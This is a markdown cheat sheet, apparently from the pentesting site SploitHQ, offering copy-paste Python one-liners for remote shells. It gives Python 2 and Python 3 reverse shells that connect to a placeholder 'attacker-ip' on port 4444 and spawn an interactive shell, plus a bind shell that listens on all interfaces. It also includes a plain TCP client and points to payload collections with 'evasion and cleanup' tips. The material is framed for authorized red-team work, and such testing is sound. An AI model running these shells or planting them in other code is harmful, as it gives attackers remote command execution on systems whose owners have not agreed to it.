# Python – Remote Shells & Network Scripting

**Python** is a powerful scripting language frequently used by penetration testers and red teamers for crafting custom **reverse shells**, **bind shells**, and **network clients**. With its built-in `socket` and `os` libraries, Python can replicate many of the functions of tools like Netcat — often in just one line.

🔗 [Explore Python Remote Shells on SploitHQ](https://sploithq.com/python)

---

## 🔍 Why Use Python for Remote Connectivity?

- Built-in `socket`, `os`, and `pty` modules enable custom connectivity
- Can create **reverse shells** without relying on external binaries
- Useful in restricted environments (e.g., no Netcat installed)
- Python interpreters are available on most Linux/Unix systems

---

## ⚙️ Python One-Liners

### Reverse Shell (Python 3)
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Reverse Shell (Python 2)
```bash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

### Bind Shell (Python 3)
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 🧰 Building a Minimal TCP Client

```python
# tcp_client.py
import socket
s = socket.socket()
s.connect(('target.com', 80))
s.sendall(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
print(s.recv(4096).decode())
```

---

## ⚠️ Notes

- Many systems have both `python` (2.x) and `python3` (3.x) — test before use.
- If `pty.spawn()` fails, fall back to `subprocess.call()` for better compatibility.
- Use firewalls or `iptables` to block unwanted outgoing connections in secure environments.

---

## 🌐 SploitHQ Shells with Python

👉 [Explore Payloads and Examples](https://sploithq.com/python)

- Prebuilt one-liners for Python 2 and 3
- Bind and reverse shell variants
- Tips for evasion and cleanup

---

## 🔗 Useful Links

- [Python socket Module](https://docs.python.org/3/library/socket.html)
- [SploitHQ Python Page](https://sploithq.com/python)
- [PayloadsAllTheThings – Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 📄 License

All examples are for educational and authorized testing only.  
This content is maintained by [SploitHQ](https://sploithq.com) for legal red teaming and pentesting use.
